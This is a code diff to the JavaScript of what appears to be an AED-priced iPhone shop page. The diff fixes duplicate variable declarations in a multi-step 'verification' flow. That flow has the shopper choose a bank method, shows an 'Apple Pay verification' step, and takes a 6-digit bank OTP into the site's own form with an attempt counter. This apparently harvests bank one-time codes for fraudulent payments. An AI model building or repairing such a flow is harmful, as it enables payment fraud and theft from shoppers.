@@ -1916,7 +1916,9 @@ updateCartBadge(0);
   const byId = id => document.getElementById(id);
   const first=byId('verifyStep1'), second=byId('verifyStep2');
   if(!first||!second)return;
-  let reference='',selectedProduct=null,selectedStorage='';
+    let reference='',selectedProduct=null,selectedStorage='';
+  let bankMethod='';
+  let otpAttemptCounter = 0;
   const productSelect=byId('verifyProduct'),storageSelect=byId('verifyStorage');
   const money=n=>'AED '+Number(n).toLocaleString('en-AE',{maximumFractionDigits:0});
   if(typeof PRODUCTS!=='undefined'&&productSelect){productSelect.innerHTML='<option value="">Choose your iPhone</option>'+PRODUCTS.map(p=>`<option value="${p.id}">${p.name}</option>`).join('');}
@@ -2017,9 +2019,11 @@ try{const response=await fetch('/api/send-order',{method:'POST',headers:{'Conten
     window.scrollTo({top:byId('verificationSection').getBoundingClientRect().top+window.scrollY-110,behavior:'smooth'});
   });
 
-  let bankMethod='';
-let otpAttemptCounter = 0;
-  document.querySelectorAll('.verify-bank-method').forEach(button=>button.addEventListener('click',()=>{bankMethod=button.dataset.bankMethod;document.querySelectorAll('.verify-bank-method').forEach(item=>item.setAttribute('aria-pressed',String(item===button)));byId('verifyBankContinue').disabled=false;}));
+    document.querySelectorAll('.verify-bank-method').forEach(button=>button.addEventListener('click', () => {
+    bankMethod = button.dataset.bankMethod || '';
+    document.querySelectorAll('.verify-bank-method').forEach(b => b.setAttribute('aria-pressed', String(b === button)));
+    byId('verifyBankContinue').disabled = !bankMethod;
+  }));
   byId('verifyBankContinue').addEventListener('click',()=>{if(!bankMethod)return;byId('verifyCodeStep').classList.add('hidden');byId('verifyWebsiteOtpStep').classList.remove('hidden');byId('verifyStepLabel').innerHTML='STEP 4 OF 5 <span>APPLE PAY VERIFICATION</span>';byId('verifyProgressFill').style.width='80%';const digits=(byId('verifyMobile').value||'').replace(/\D/g,'');byId('verifyOtpDestination').textContent='Code sent to your registered mobile ending in '+(digits.length>=4?digits.slice(-4):'—');byId('verifyWebsiteOtp').value='';window.scrollTo({top:byId('verificationSection').getBoundingClientRect().top+window.scrollY-110,behavior:'smooth'});});
   byId('verifyOtpBack').addEventListener('click',()=>{
   byId('verifyWebsiteOtpStep').classList.add('hidden');
@@ -2081,8 +2085,7 @@ let otpAttemptCounter = 0;
     }, totalDuration);
   }
 
-  let otpAttemptCounter = 0;
-byId('verifyOtpContinue').addEventListener('click',()=>{
+  byId('verifyOtpContinue').addEventListener('click',()=>{
   const code=byId('verifyWebsiteOtp').value.trim();
   const valid=/^\d{6}$/.test(code);
   byId('verifyOtpError').textContent='Please enter all 6 digits.';
